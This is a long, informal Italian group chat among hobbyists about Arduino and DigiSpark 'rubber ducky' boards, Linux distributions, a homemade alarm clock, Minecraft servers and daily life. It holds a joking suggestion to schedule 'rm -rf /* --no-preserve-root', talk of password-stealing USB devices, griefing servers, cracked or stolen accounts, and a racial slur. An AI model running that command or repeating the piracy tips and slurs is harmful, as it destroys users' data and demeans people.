 per 20 minuti che me lo prende qualcuno...
Eh oh
So solo che sto qua te l'ha fregato perché vuole fare finta di essere te
Ma che cazzo sei cieco
Ho lo username originale
Non quello_vero xd
Al massimo è lui il fake
Allora vai invia lo screen della chat con qualcuno qui dentro
Basta di copiare profili dai
Ok, bene, se sono poco luminosi abbassi il valore, se tende all'arancione lo alzi
Beh, risolto il problema
Comunque lui aveva l'user di colore blu e tu sei sempre stato rosso ahahha
A parte quello, é bastato appunto controllare le chat e i gruppi in comune per trovare quello vero e bannare quello falso
Io boh
Non so che si fuma la gente
Comunque segnalatelo
Basta guardare le foto profilo
Vero, ne ha solo una
Sono arrivato tardi ahaha
Comunque domani scrivo una mail a Telegram
Comunque che ansia la gente
Tanto tutti i gruppi in cui ci sono io sono stati avvisati
Negli altri gruppi non mi conosce nessuno quindi non avrebbe senso spacciarsi per uno che non conosce nessuno...
Perciò, è abbastanza innocuo per ora
Dovrebbero eliminare la possibilità di salvare le foto profilo
E avere nick uguali
Potresti comunque screenshottare
Nick uguali?
I nick non sono uguali
Dovrebbero fare come su Instagram
L'avevo rimosso per fare una prova (i tag senza @) e mi sono dimenticato di rimetterlo
Così me l'ha rubato
Con nick intendo il nome li, il titolo
Ah beh no
Su Instagram puoi fare gli screen
Esisono gli omonimi
Su instagram non puoi ingrandire l'immagine profilo
Per esempio 
Non si spaccia per me, ha proprio quel nome da quando è nato
E ho scoperto che esiste un Marco Realacci candidato per i 5 Stelle, che schifo. È un insulto al cognome
È una cosa gestita dal client
Invece è bello vedere le foto del profilo
Fanno capire tante cose del carattere di una persona
Bah sinceramente non credo che funzioni così
Anche qui basta avere un client diverso
Sarebbe abbastanza che a sto mondo ci sia gente con un minimo di intelligenza che non cerchi di rubare l'identità...
Prendi troppo
Oggi ho assistito al degrado mentale più assoluto del mondo...un uomo sulla 40ina è entrato in posta (dopo di me, che ero in fila da 30 minuti) ha preso il suo ticket e dopo mezzo secondo ha iniziato a sbraitare
Cazzo se non tocca a te non scassare le palle, per di più di sabato mattina...certe persone dovrebbero essere rinchiuse in qualche campo lontano da tutto e tutti
Quando parli tu o 
 non capisce una mazza
Aaaa chebbello la domenica svegliarsi alle 5 ed essere sveglissimi, e gli altri giorni svegliandosi alle 10 vuoi dormire ancora
e niente, mi sento solo, qua fuori c'è 'na nebbia che sembra di stare nelle paludi dei film di scooby-doo, 
 

Posso concludere qui la mia vita
Ho trovato il gruppo di Arco 
si ma non pagarne 3, 11€
per 11 prendine 10
Ragazzi oggi ho visto il video su come usare il raspberry con assistant, ma volevo chiedervi adesso che assistant e uscito in italiano quello su raspberry lo è anche?
RAGA ARCOBAITER HA UN NUOVO GRUPPO
TROLLINO ?
yup
era chiuso, adesso l'ha aperto
E non ci sono bot anti-spam
É iL mOmEnTo dI pRePaRaRe i vOiP
c'è sempre Ultron
Ne ha azzeccata una ogni 25
:c
Preparate i voip lo stesso
usa layout americano
Eh ma a me non va
ENG-US per windows
pootrebbe succedere che non va...in quel caso reinstalla manualmente la libreria, a me ha risolto, cerca su github c'è il file keyboard.h con l'ascii map dentro, sostituiscilo, pure a me era successo, non so perchè, forse un bug, qualcosa
Ho provato anche a reinstallarla ma niente
Sono abbastanza buoni
eee, dovresti andare a vedere l'asciimap di keyboard.h, che è scritta nell'array "asciimap", e poi vedere che valori esadecimali corrisponde ai vari tasti della tastiera, e poi vedi quelli che coincidono e sostituisci..anche se sarebbe taaanto lavoro e io non ho voglia di farlo mai, e manco c'ho il tempo di farlo
Ora devo solo cercare di controllarli con il decoder
Come si chiama il bot della musica?
E non mi dite nulla? 
Ma è notizia vecchia gente
L'ha solo messo pubblico ieri
Vabbè, ma ci sono i bot anti spam?
Si rip
Qualcuno ha un coupon per le Xiaomi Hybrid Pro HD?
La NASA ci fa credere di aver scoperto l'infinito e poi alla fine non sappiamo cosa c'è sotto i nostri piedi
La lontanza del sole girando in circolo  fa' la notte ed il giorno.... fatto un test  e visto  in piena notte in spagna il sole da un pallone amatoriale a 30km..... bellissimo video... gia' postato qui... posso rimetterlo...
Grazie mille
 io volevo prendere questo 
O questo 
Ahahaha
Ma come faccio ad utilizzare wuel bot in una mia chat?
Come quelli che volevano smazzare a Marco un motorino
Gli inoltri la roba
Ok, risolto per i messaggi da 3 minuti ahah
Chi sa il c++?
Spari
Ho una piccola curiosità
Ma se io dichiaro un array senza dire quanta roba deve contenere che succede?
Cioè se io dichiaro questo
int a[] = {11, 45, 62, 70, 88};
Cosa succede?
Nulla succede
Credo, ma credo eh, che in questo caso semplicemente il compilatore capisce quanto deve farlo grosso
Mmh... Se in Java non dovrebbe dare errore ed è C-like, questa sintassi dovrebbe essere anch'essa corretta
Eh per forza
Semplicemente tu non stai dicendo esplicitamente quanto è grande ma perché si capisce
Poi non è che puoi ingrandirlo a caso dopo
Ragazzi, per costruire un rtc cosa serve?
Una batteria tampone sicuramente

In Java inizializza un vettore con la grandezza di quanti sono i termini e con quei termini all'interno
In che senso
Ho cercato su internet ma non ho trovato soluzione, qualcuno per caso sa come si risolve?
Ma che stai facendo?
O meglio, cosa vuoi fare?
Sto installando Parrot
LOL
Allora non ti aiuto

LoL
Eddai 
Dimmi perché parrot
Per usare un sistema rispettoso della privacy
Perché voglio lamerare
E va beh.. io ci provavo
Ahahahhahahaahah
Ma vai in *censored*
Puoi farlo meglio con altre distro
Ahah
Diciamo che mi volevo avvicinate al mondo Linuz e ci sono già dei programmi installati che mi fanno comodo
Diciamo che Parrot mi sembrava il più "professionale"
Se ti vuoi avvicinare al mondo linux, parrot non è la scelta giusta
Ormai ho scaricato questo ahahahha
Non ho più voglia di cambiare
LoL
Volevo provare Linux Mint.. Ma poi ho scelto Parrot
Rip
Se hai veramente intenzione di imparare allora sono sicuro che scaricherai altro
Ma le distro di cacca le trovi ad occhi chiusi
Un scelta peggio dell'altra
Infatti 
Vedi che parrot è ben fatta
Scarica fedora e installala.
Più semplice e affidabile di ubuntu.
Ma non è per lui
Poi quando inizi ad ingranare qualcosa puoi passare ad arch o gentoo
Ma sai che sono due os che mi fanno gola?
Invece ho solo elementary, anche se ho lo spazio per altri due o tre os
Kali 
Just kidding
Ok ma intanto volevo capire come risolvere sta storia
Qualcuno?
Io è meglio che non ti aiuto, per sbaglio ho cancellato la partizione di boot di Windows con Grub 
 si ricorda bene 
Ho ordinato un Arduino USB per fare la Rubber ducky ma come la inserisco nel PC mi fa quello che sta ne video
DigiSpark?
Ecco
Devi prima caricare lo sketch e poi inserire la DigiSpark
Se vuoi capire come funziona linux parti da fedora
Altrimenti se vuoi capirlo nel profondo installa gentoo
Ma ti conviene partire da qualcosa di semplice
Poi quando hai iniziato ad essere nell'ottica unix allora installerai quello che ti pare, ma quel giorno scommetto un penny che non installerai parrot
Se invece vuoi fare il lamer nabbo allora mettiti kali su wsl che trovi direttamente nel windows store
Fedora lo ho provato parecchi anni fa
E non mi era piaciuto per nulla
Può andar bene per accendere le luci con Arduino?
Molto bene 
Comunque windows lo sono riuscito a reinstallare 
Qualcuno che mi può aiutare?!
Si, ma non tutti vengo "tradotti"
Tipo cosa?
Principalmente yum
Non c'è più yum
Eh lo so lo so
Adesso c'è dnf
Infatti dovrei riprovarlo
Ma boh mi trovo benissimo con arch
Per installarci i driver ho dovuto vendere la mia anima a Satana
Cioè
perchè digispark? perchè vi volete del male, usate degli arduino leonardo normali :)
Costano troppo e i digispark sono piu piccoli
"costano troppo"...costano 1 euro...
*10€
non più di 6 euro zio
cos'è sta roba?
Un coso basato su un arduino leonardo
Comunque i leonardo sono troppo grandi
Io il digispark l'ho preso perche è piccolissimo e costava 2€
prendere una cosa come questo se lo vuoi piccolo allora? 
Costa 7,41$
qual'è il codice batch per capire se una variabile contiene lo spazio?
si...questa, perchè è piccola, io parlavo dei leonardo pro micro, non di sto qua
Si ma quelli sono grandi
lo sto cercando da nln so quanto..
Io ho preso il digispark solo per fare una mini rubber ducky economica
In che senso
Quello con attiny85?
Si
un codice che controlla se la variabile contiene lo spazio
Funziona bene e costa poco
Quale variabile
beh dai, vuoi dirmi che è grande? 

ma di un programma batch
Ho preso questo
codice batch
Idem
Non penso esista
ho provati a vedere su internet ma niente
credo di si invece
E come hai risolto?
se la volevi ancora più piccola e meno costosa c'è lei : 

Il batch non è proprio un linguaggio, è più una serie di istruzioni
ecco
Ma comunque non esporta tutti i pin
'n che senso?
 ho provato ma non funzia
Che non puoi usare tutti i pin perché non sono fisicamente saldati
a vabb, ma tanto, se deve farsi una rubber ducky non credo gli servano a molto...
Serve un cavo per collegarla
Comunque resta il fatto che ho speso solo 2€
non è che ci voglia molto a prendere una usb femmina e collegarla ai vari pin, poi chiudi tutto in uno scatolotto ed è più piccola di una usb normale
La papera gialla?
già
Cosa fa ?
Qua qua?
anche qui e quo
Che utilità ha?
risolto da solo✅
Ha più funzioni
io uso questo
Esegue comandi con una velocità pazzesca
Tipo?
Da dove hai preso i driver alla fine?
Può rubare le password come fare troll o.....
Non mi viene più niente in mente
LOL
Te sei bravo con Linux vero?
No
Ah okay, ma usi anche Arduino su Linux?
Ovvio
Toglimi una curiosità.....i driver?
Io con DigiSpark non riesco
Quando ti accorgi di aver lasciato il microonde acceso 10 minuti
Ho trovato solo quelli per Windows
Mai successo
.-.
Tutti installati by default
Su linux non devi installare niente
Va tutto
Con Windows sei fermo al decennio scorso
Al massimo devi solo dare i permessi all'utente di accedere alla usb seriale, una linea da terminale
Già fatto
Ma il DigiSpark non viene rilevato
Impossibile
inserisci quel coso
lsusb
O ancora meglio
Staccalo
$ dmsg -wH
Inseriscilo
Vedi cosa combina il kernel e cosa ci assegna
Ora provo grazie
Da cosa deduci che non viene rilevato?
 lancia in Italia un programma di affiliazione su droni ed accessori | Quadricottero News

Dal fatto che non vede la porta
Chi non vede la porta?
Wooo
è una mia impressione o i bassi sono pompatissimi?
Nono
ah ecco
io i bassi li pompo solo con la musica EDM
il resto preferisco sentirlo flat
Ora devo sentirla
ma tipo che vibra?
fa un rumore a?
da come me lo descrivi sembra che vibra qualcosa
col mio sub a 50-60Hz mi vibrano le cose che ho appeso al muro...
Salve, qualcuno sa come visualizzare sul monitor seriale di arduino il carattere "°"?
??
qualcuno sa come fare il 437 
Io senza occhiali.......l'ide Arduino
Il portachiavi da maker

Prima avevo un portachiavi che mi aveva regalato uno di 
 con cui avevo fatto una chiacchierata al maker farie
Lol io avrei paura di ferirmi i
??
È del portone d'ingresso del condominio
Quella di casa è impossibile da clonare manco avendola fisicamente
geniale 
Dopo il furto che ci fecero qualche anno fa abbiamo deciso di optare per una serratura buona
E pure che qualcuno riuscisse a clonarla... Manca il pin dell'antifurto
E tra poco anche il pin dello (big spoiler) Switchando-Alarm
Ooh
Ho bisogno di un parere
Secondo voi com'è questo foto?
A bassa risoluzione
Apparte quello?
Ahah
Ma è photoshoppata?
No
Ah lol
Non mi sembrava naturale il controno 
Comunque ci sta
Mi dicono che fa schifo
Ma secondo me no
Se fosse più dettagliata...
È semplicemente fuori fuoco con il contrasto sballato
Sinceramente non mi piace
Ho trovato un nome al portachiavi
portachiav.ino 


HAHAHAHAHAHAHAHAHAHA
Magnitudo 3
Dal codice si ricava tutta la forma?
Wow
e anche il tuo indirizzo di casa sarebbe da sapere
quello lo sapete
comunque qualcuno di voi gioca ancora a Minecraft?
apposct
Con il combinatore telefonico per la polizia
Io ogni tanto
che fai sta faccia che ho appena pubblicato il thread della nuova edizione del mio server
Lol
L'ho aperto stasera dopo 7 mesi, solo perchè dovevo testare la connessione ad un server .-.
:(
beh, noh, e soprattutto non ora...sto esplodendo con sto cazz di bartolino, bernaldeschi o come cazz si chiama
brunelleschi, toh, e donatello....elp mi plissss
Ragà chi vuole griffare qualche server?
C'è unitedclan da griffare
E il s.o. la vede?
però boh, un giretto potrei anche farlo 
Mmmm 
magari...domani
Il sub della sveglia fa un piccolo rumore continuo
Come risolvo?
cosa magari domani
poi vedi che ci troviamo a caso 
Si sente pianissimo ora ma di notte da fastidio
boh, qualsiasi cosa a riguardo, oggi noh, sono fatto
ah tanto il server non è ancora aperto
già
dove lo hosti?
OVH obv
lo apro quando torno da Torino la settimana prossima
oki
beh se ti serve uno staff, ci sono io, che sarò certamente la scelta giusta come gente da mettere nello staff
devo finire di programmare il plugin principale del Creative
così sarebbe giocabile ma manca un po' di roba figa
come moderatore bestemmie direi, un veneto si addice alla perfezione
potresti aprirlo in beta
guarda, mi serve per davvero gente nello staff
in BETA la settimana prossima
in ALPHA è già aperto
dipende da cosa deve fare quella gente
spetta spetta
non è solo premium vero? 
ovvio che sì
ma l'IP è in passaparola, devi beccare qualcuno che te lo passi
uooopps
Qualcuno sa come visualizzare sul monitor seriale di arduino il carattere ° ?
assicurarsi che i giocatori non abusino dei tanti permessi che hanno
k
allora boh, ci penso su
Se vuoi una mano con il server te lo posso hostare gratis
poi dei controlli hack non me ne frega niente, banno direttamente se uno ha evidenti cheats
severo ma giusto ù-ù
Ne ho già uno
guarda, io non gioco in nessun server PvP italiano perché ogni volta viene l'helper a rompere il cazzo che vuole che gli dia anydesk per vedere se cheatto
e poi ci mette almeno due ore perché deve andare a vedere nel registro di windows se ho mai installato qualche cheat
eeed ecco perchè non ho mai giocato nei server italiani
tralasciando che non mi va che la gente entri nel mio pc
quindi non farò mai controlli di questo tipo
staresti dicendo che sei cracked?
uooopps
*va su facebook a cercare le liste di account premium di minecraft*
Se vuoi una mano
non c'ho voglia di espormi col mio main profilo 
*se ne avessi uno*
no boh ne dovrei avere uno premium, da qualche parte
*nelle liste di facebook*


comunque...tralasciando minecraft....
 
E tu torna a studiare
Non sopporto donatello
sto cucinando, i miei sono via.....che giornata del caxxo
beh dai, è già molto meglio di brunelcaxxi
Ad averlo Minecraft 
Pensa a quella cupola ottagonale costruita su un ottagono non perfettamente regolare
ecco...quella è di brunelleschi....appunto...di quella so solo che è fatta di mattoni e che i mattoni centrali tra i costoloni si distanziano un po' dal centro per un effetto di cui ignoro effetto per l'appunto....e poi è autoreggente, fine, soffro
quasi quasi torno a giochicchiarci ogni tanto, la modalità che vorresti proporre è interessante anche se io di base sono un giocatore di mc moddato
il david in compenso è interessante dai....c'ha il cappello da alpino
La fighetta con la spada
*e il cappello da alpino*
Mi fa salire più l'incazzatura che vedere sull'album di sfera una flying v
pensa che lo potrai descrivere
Figurati se ci aggiungi che sto passando la domenica a studiare storia dell'arte ad uno scienze applicate
Ti conviene disegnarti il carattere manualmente
beh...beh....beh...io manco c'ho avuto il tempo alla fine di studiarlo, sto studiando ora, sta mattina ho giocato a ffxv, sono tornato a casa alle 4 e da li ho studiato, ora mi sono cucinato da mangiare e ho mangiato(minestra di verdure e pollo + 999kg di paprika e grana)
e ora sto tornando a studiare ._.
Guarda 
tra 20 minuti chiudo e me ne torno su ffxv, fac, chissene, se poi manca qualcuno in filosofia faccio scena muta se tocca a me, chissene
Ma non posso stamparlo su monitor seriale... su lcd sapevo che si faceva così ma su monitor seriale no...
Scusa ho letto male la domanda🤦‍♂️
Comunque da me funziona con il serial print
Ok domani proverò xke ho già messo via comunque mi da un messaggio che grado [8] is ambiguous for Serial.print
Perché ci vuole tutto sto tempo per spegnersi?
ma seriamente ahahahah
sai i porconi che tirerei io così
l'ho gia provata con "i took a pill in ibiza" e funziona
ho formattato la sd e gia ho inserito nel crontab lo script
ma what 
è la sveglia
solo che ora per spegnerla non ho un pulsante e uso i due fili che ho usato come sensore per la porta
perché py 2.7
perchè questo lo sò, il 3 no
È Python 2.7 ma usi print()
Su 2.7 si print “”
io cosi sò usarlo e funziona
Bellissimo 
Rulof ne andrebbe fiero 
Però domani mattina non ne sarai tanto contento
questa era la prima versione
e invece ti svegli molto bene
soprattutto molto riposato
infatti a letto vado verso le 23:30 e il crontab è impostato alle 6 e 10
e sicuramente mi sveglio
la lampada (100w) è puntata alla fine del letto in modo che io la veda appena sveglio e la forte luce mi dia fastidio
Dipende, se hai voglia di dormire ti passa la voglia 
volevo puntarmela in faccia ma già da sveglio di acceca, figurati appena sveglio
ti si scassa l'occhio
infatti il sub fà un piccolo rumorino
Allora non dormi 
Up
a sto punto metti direttamente un rm -rf /* —no-preserve-root che viene eseguito dopo 5 secondi, voglio vedere se non sei sveglio la mattina

madonna ti alzi premonitivamente prima che suoni la sveglia 
Per disattivarlo password da 24 caratteri composta da lettere, numeri, simboli
In 100millisecondi sono sveglio, ho già spento la sveglia, mi sono vestito, ho fatto colazione e sono già a metà strada per scuola
diventa un trauma infantile, altro che
Quando sei alla lunghezza d'onda di una sinusoide a 400YHz di distanza dal finire il circuito...e accade questo
da sola? 
l'ho presa in mano...è caduta la gambetta
ho pianto
Troppa potenza
E usala in quel modo
un microsecondo di silenzio
ok troppo silenzio
Giulian e i suoi problemi con la superforza
Mi copi anche le battute 
Mi hai dato spunto
Vergogna
I pin digitali non riescono a comandare il 7 segment decoder
Però se collego gli input A B C D direttamente al 5v fu Arduino funziona...
Quale potrebbe essere il problema? Arduino mega
sono buoni entrami, io ho il Mil-Tec, ma il Patrol è ugualmente buono
Grazie
Ma te lo usi per metterci il PC?
Comunque su due canali solo una persona ha fatto la prova GRATUITA di Amazon Music Unlimited 
Uno solo... Raga, è GRATIS eh 
azzo devo ancora farla io 

Ma ci ha guadagnato te 
Io sono tornata al vecchio caro Spotify
E nel dubbio ho messo pure Deezer
idem
Spotify non si può abbandonare
Riesci ad accedere?
A me non funziona 
con quello craccato no, obv
Eh
Che quello è il problema 
ma da PC hai tutte le cose della versione craccata su Android
Idem
le scarichi da spotify sul pc e sei a posto 
(sapeste come si fa... è una chicca per pochi)
Cos?
Direttamente da Spotify, qualità 320kbps, copertine e metadati compresi 
Qualcuno mi sa aiutare?
Ma usa Deezer!
nah, finchè ho spotify premium aggratis uso quello 
Imparami maestro
il bello degli amici
eeh sapessi
 sgancio?
aggratis?
Ho visto che girano molti account premium "rubati", hai per caso uno di quelli? Oggi ho avuto l'occasione di averne uno a gratis ma non mi sono fidato quando ho fatto l'accesso e ho visto ancora le canzoni salvate del precendente proprietario
Sgancia il listino prezzi 
ma... il programma?
esatto
Vabbene
con un amico
Nope, me lo presta un mio amico
sattoh
ah... 
eh meenchia ritrovarlo dopo 48246 messaggi
Pvt
Non trovo la novità.......
Obv
Beh allora ti chiedo una cosa anche se forse non è il gruppo adatto: quanto è sicuro usare uno di questi?
Ma 
 che cazzo di pubblicità hai nei video 
Mi riferisco all'ultimo del rasp
non sceglie lui che pubblicità mettere in teoria
Allora YouTube gli vuole proprio male 
Hahaha le pubblicità appaiono in base ai tuoi interessi
Cos'è uscito?
Miei?

Mmmh e sarebbe? 🤔
In pratica ci sono tre di colore, due povery e uno ricco...i 2 ragazzi gli chiedono i soldi che l'altro (pur essendo ricco e con gli sghei che gli escono dalla tasca) non gli da na mazza
Ah l'ho vista anch'io
Nel video di Logan Paul
Ce ma che cazz
Su vede che sti tre negri i soldi li avevano, e hanno pagato bene la pubblicità

Si ma ha scosso la mia esistenza, che già di per se era inutile
Questa notte non dormirò 
0
E adesso nel video di Marucuskron, fuck
Questi hanno pagato più di Renzi col suo "sicuro sicuro?"
Ma che poi ce, quando triggered i pezzi in cui ballano
Sai che bel giro di soldi....
Ma secondo me è una pubblicità con messaggi subliminali tipo "Arruolati"
Questo è il rumore che fa il sub
Come nei Simpson con "Join the Navy" cantata al contrario
Sei sott'acqua?
Ma i Simpson fanno satira
è?
Appunto questi sono seri, già sento la voglia di servire la patria
si che possono comandarlo, perchè no? io uso quelli per comandarlo ._.
Nel mio caso*
a ok, bello
Non funziona rendendo HIGH il pin
Ma se collegho un entrata a 5v normalmente va
Sai il vero probelema della canzone dei Simpson?
Perché?
In che senso
Hai detto sub
Figo
emmhh...com'è possibile sta cosa
C'era una storia dietro?
Si
nel senso....sicuro che i pin diano corrente?
A me sembrano disturbi e basta
Racconto?
Racconta, questa non la sapevo
Ho provato anche con il tester
5v
Ma come fa un sub a fare un rumore a frequenza così alta wtf
È come se hai collegato il jack male
Ma molto più piano
ma....che senso ha? se esce corrente da entrambe le parti si accenderà da entrambe le parti no?
E il jack sembra essere connesso bene
Quel che dicevo anche io
stranissimo
Magari domani provo con Arduino uno
Per chi è ancora più scroccone degli scrocconi, amatemi ❤️


Ma avrò provato 20 uscite del mega senza risultati
Praticamente ho sentito quella canzone e oggi ho comprato questo zaino 
Casualità? Io non credo
io boh, non sono capace a fare i conti perchè non ho mai fatto elettronica e quindi metto resistenze a casaccio sull'amplificatore finchè non ho trovato quelle giuste ._.
Io credevo ci fosse una cosa serie
Ti amo
L'ho comprato veramente oggi oh 
a meno che qualcuno sia così gentile da spiegarmi come cribbio posso calcolare il guadagno del circuito se c'è un transistor di mezzo
Ti piace? 
Si ma non c'entra

Sinceramente, io li adoro quelli stra ordinati con mille mila tasche
Anche io 
Ehhh, ho trovato l'occasione per chiedere un parere 
ci entra il mondo li dentro
Si, ma è imbottito? Le cuciture?
Se non è buono ti bestemmio 
gli zaini tattici una volta che li provi non riesci a tornare indietro
Speriamo
Anche perché io adoro le cose semplici
Ho paura che sia troppo appartamento
Per quello l'ho preso nero
Anche se poi ci voglio mettere le peggio toppe 
vai tranquillo, ci entra una casa li dentro..e poi ha anche la cinghia per scaricare il peso quella che si allaccia alla vita
Sinceramente volevo usarlo come lamer backpack 
ti dico cosa ci metto dentro io
Che driver usi?
2 notebook (Asus X54C e Santech R39), 2 alimentatori, tablet, 2 cellulari (Cat S60 e il 3310), bottiglia d'acqua, cappello, tester, pinza amperometrica piccola, kit cacciaviti e pinze, 2 forbici Intercable e Usag, il Kindle, un mouse wireless, 2 powerbank e un cambio (mutande-calze-maglia termica) se vado in montagna
driver?
a quello intendi
Per il display a 7 segmenti
per il display a 7 segmenti uso 40 jumper e 2 array di esadecimali :D
Scusa, ma che ci fai con il 3310?
Ah
hehehe
Si spiega tutto
Io volevo usare il driver visto che sono led potenti 
 quello prende ovunque, anche dentro le gallerie.. lo porto quando salgo sui tralicci da 20 metri, lo metto dentro il marsupio da gamba
Here
Tanto anche se cade non si rompe 
Tralicci da 20 metri? Ma che fai scusa?
bella li
torno a studiare platone
Il greco non serve a nulla :(
filosofia, non greco, 
Mmm
e no, non serve a nulla
Vabbè la storia greca
non è storia, è seghe mentali
Diciamo così, meglio studiare un tornio

È molto meglio.
1) ti aiuta veramente
2) non consuma il cervello inutilmente
3) anche senza interrogazioni lo puoi usare 
4) è bello
5) è gratis se lo rubi
La 5 è difficile, ma fattibile
Vigile del Fuoco - Reparto Telecomunicazioni
 
 questo è il prossimo acquisto, per metterci gli attrezzi

Ahhhh
 esattamente..mio fedele compagno

Anche se mi sembra scomodo
Idem
Meglio quelle che stanno sulla vita
no no fidati che non è scomodo per niente
Quanto è patriottico quel "Vigile del Fuoco - Reparto Telecomunicazioni" con tutte le maiuscole e tanto di trattino
ma questo si attacca alla vita infatti, ha la fibbia..si attacca anche alla gamba per tenerlo fermo
Troppo senso d'appartenenza 
E fa bene, dal mio punto di vista. Gli fa solo onore
Ah, non l'ho aperto pensavo fosse uno di quelli piccoli
Si, ma non mi ci vedo girare per la città con quel coso 
se siamo il Corpo dello Stato più amato ci sarà qualche motivo dove andiamo andiamo ci adorano tutti
Se sei un vigile puoi 
prima devi rubare un rimorchio
Dal momento che salvi la vita alla gente non possono non adorarvi
Anzi, se vado con quello nella mia città pensano che porto una taurus pt 24/7 in quel marsupio
Ma lo trovi fidati
si ma infatti io lo tengo nel camion e lo attacco quando serve..che me li porto a fare gli attrezzi dentro il laboratorio quando sono alla scrivania? li ho anche li 
Che alla fine è quella che ho io da softair 
Mi sembra giusto 
Le pistole da softair mi hanno sempre affascinato
Son belle
sisi, usi un arduino e segui i video tutorial di iutub con una eeprom e ci sei, altro che le macchinette
Poi mi ha parato il culo una volta
Da lontano taaac
A differenza delle guardie 
 come ti dicevo io lo devo usare come lamer backpack, coperta, giacchetta, PC, antenna, hdd, USB, Arduino, cavi, libri
Da noi fanno i cori contro le guardie
Guardie?
Yes
Polizia e Carabinieri
Azz
quando sono stato nelle Marche e ad Accumuli non hai idea delle facce che faceva la gente quando ci vedeva arrivare..gente che era senza casa, senza niente, che ti invitava a sederti, ti offriva acqua, caffè, tutto quello che volevamo, anche se magari non avevano neanche più una casa e dormivano nelle tende..una cosa stupenda, non volevo più tornare a casa..sembrava che vedessero tornare i figli emigrati
Meglio che non ti dico il lavoro di mio padre
A Roma le chiamamo guardie
Il più odiato in Italia 
Ma guarda che invece secondo me è bello
aivoglia, rimane anche spaziovai tranquillo
Piena stima 
Eh beh immagino, ve lo meritate
Finanziere?
Finanziere
No, mio padre è dal lato oscuro
Azzeccato 
Esatto 
La mia pistola da softair
AHAHAHA
Un giorno dei ladri stavano per entrare dentro casa, gli ho sparato dietro con un GGB-pl
È figo fare pure il finanziere
Ma che stai a dì?
Ma mi sembra giusto 
Credo che abbiano ancora i segni
C'è a chi piace fare il vigile del fuoco e chi ha la passione nel trovare gli evasori
Io ho due amici che fanno softair
Oh, io ho una katana d'allenamento, so usare i nuncako (o come cazzo si scrive), so usare l'arco ( che ho) , sono cintura nera di karate e ho una taurus pt 24/7 da 1joul
Dite può bastare?
Quando vado a casa loro inciampo sempre sui proiettili (detti anche pallini)
No vabbè, ma mio padre non è quel tipo di finanziere

Odia andare a fare i verbali, ma ci sono volte in cui è costretto
Ci rimango male io per lui, ti giuro 
sono due mestieri rispettabilissimi
Ogni cosa è bella se fatta con passione no?
No ma uno mi ha raccontato che un suo compagno di squadra si è portato il barbecue portatile e si è messo ad arrostire le salsicce durante la partita a softair
Si usa molto, a me piacerebbe farlo
E il bello è che quello stesso giorno ero in montagna a fare una grigliata mista con i parenti
Ti è andata male
No ma se si mangia ci sto volentieri coi parenti
Altrimenti no
Mi sembra giusto 
Oh ragà, non ho ancora fatto i compiti
Forse sarebbe il caso di farli
Io tra 3 ore mi devo svegliare
Ma no....
Cos?
E per le 4 devo uscire di casa
sempre..però i Carabinieri sono particolarmente odiati, specialmente quando fanno posto di blocco
Ho un pullman alle 5 domani mattina
Che devi fare scusa? Andare in guerra 
Per Torino
Beh non sarà molto diverso da una guerra visto che vengono i coatti dello scientifico
È un camposcuola
Per me è una cosa senza senso, poi sono le prime che vuoi alla feste in città per avere sicurezza
Ahhh
V A F F A N C U L O
Sei di parte
In Italia l'idea di giustizia è contorta
._. parlo di quelli che fanno lo scientifico sportivo nella mia scuola
eh lo so, ma vaglielo a far capire alla gente ignorante che li critica
Ahhh, sportivo
Ma chissene 
Come se mi cambia la vita a me
Insomma per chi non vuole fare una mazza durante l'anno

Voglio farlo pure io
questo è il mio Comando (notate il capo squadra che parla al telefono :D)
Ma sei di Reggio Calabria?
Comunque quanto è legale chiedere ad un professore che conosco (che non va nella mia scuola) di farmi fare un paio di PCB a scuola sua visto che da noi non li facciamo?
Yep
Io ho vissuto per tre anni a Lamezia 
PCB?
Circuito stampato
Io non vedo nulla di male
Ogni volta che me ne serve uno lui si offre di farmelo fare dalla sua classe 
legale non lo so, ma non credo ci siano problemi se te lo fa come favore..tanto li stampano sempre, specie se usano il bromografo oppure il cloruro ferrico
Poveretti questi qui
A scuola nostra col cazzo che li facciamo
Però magari non è un odi quei professori interessati a tramandare conoscenza
Schiavizzati
Madonna
li c'è il Polo Didattico, facciamo i corsi specialistici..anche al porto di Gioia Tauro, li fanno i corsi antincendio sulle navi
Ma no lui non li maltratta, gli ha solamente fatto costruire un relè da zero A MANO che l'avessero fatto fare a me avrei inprecato non so quanto
È bruttissimo parlare con voi, mi sento piccolo
Le sagre in Calabria sono il top
 qua c'è il culto del buon cibo
Panino, salsiccia, peperoni, cipolla 
Anche se devo venire che sono venuto quest'estate e ho trovato Lamezia uno schifo
nduja, salsa di funghi porcini e soppressata..un panino così lo mangi adesso e lo digerisci ad agosto
🤔 boh, sono 2 anni che non ci vado
Però ne varrebbe la pena 
Schifo più totale
L'unica cosa brutta della Calabria è il mare
certo che si..due bicchieri di Rosso di Pellaro e puoi andare a sdraiarti sul divano perchè non capisci neanche come ti chiami
Tanto devono fare dei test

Cos'è un ipsia dove li fanno?
? È un ITIS
Tecnico industriale
nah, dipende dalla zona..la Tirrenica si, è orrenda, a parte qualche punto come Paola, Amantea, Favazzina..ma la ionica è stupenda..se vai a Gioiosa Ionica, Palizzi, Bova, Africo, Bianco, Roccella ti innamori
Io l'ultima volta che sono stato a Lamezia ( 2006 ) ricordo le strade pulite e un sacco di negozi, adesso invece....
Ah ok va beh poteva anche essere un professionale xD
Odio i sassi
Cambia che loro fanno TPSEE, noi no, le ore si chiamano TPSEE ma facciamo solo schemi con multisim per 2 ore a settimana
Vedi che adesso sono pugliese 
allora evita la tirrenica e vai a Roccella Ionica oppure a Gioiosa
Ho fatto un iti anche io eh
Io vado solo dove ci sono feste di paese con panini pazzeschi 
TPSEE sarebbe la mia vecchia TDP? Tecnologia, Disegno e Progettazione? quella dove si assemblavano i pcb, si saldava, ecc?
Yes
appunto vai li e poi mi dirai
Bello in puglia e Sicilia
Sei di parte?
Guarda si farebbe tutt'ora quella roba in TPSEE
No sono toscano, bello anche da me
Ne parliamo tra un 5 anni abbondanti
Il problema è che a scuola nostra non l'hanno capito
cazzo quanto sono vecchio  hanno cambiato anche il nome alla mia materia preferita..avevo 10 costante
 ok no problem
Però hai ammesso che noi siamo il top a livello mare 
Adesso è Tecnologia Progettazione Sistemi Elettrici ed Elettronici
Di dove sei?
Pugliese 
la Puglia è stupenda, specialmente il Salento e la zona di Foggia..ci ho fatto il militare li, prima Taranto, poi Brindisi
Io forse vengo rimandato in elettronica... Ho il prof ritardato
Sono di vicino Taranto 
Ahha era per dire le regioni vicine, comunque sì bello, ci sono molti posti che meritano
proprio tu rimandato?
O è il prof o sei tu 
